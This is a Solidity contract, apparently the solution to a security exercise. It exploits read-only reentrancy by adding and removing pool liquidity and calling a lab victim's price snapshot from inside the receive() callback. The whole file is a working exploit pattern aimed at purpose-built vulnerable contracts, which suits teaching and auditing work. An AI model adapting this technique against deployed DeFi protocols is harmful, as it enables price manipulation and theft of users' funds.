// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../ReadOnly.sol";

contract ReadOnlyPoolAttacker {
    ReadOnlyPool pool;
    VulnerableDeFiContract victim;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _victim) payable {
        pool = _pool;
        victim = _victim;
    }

    function attack() public payable {
        pool.addLiquidity{value: msg.value}();
        pool.removeLiquidity();
    }

    receive() external payable {
        victim.snapshotPrice();
    }
}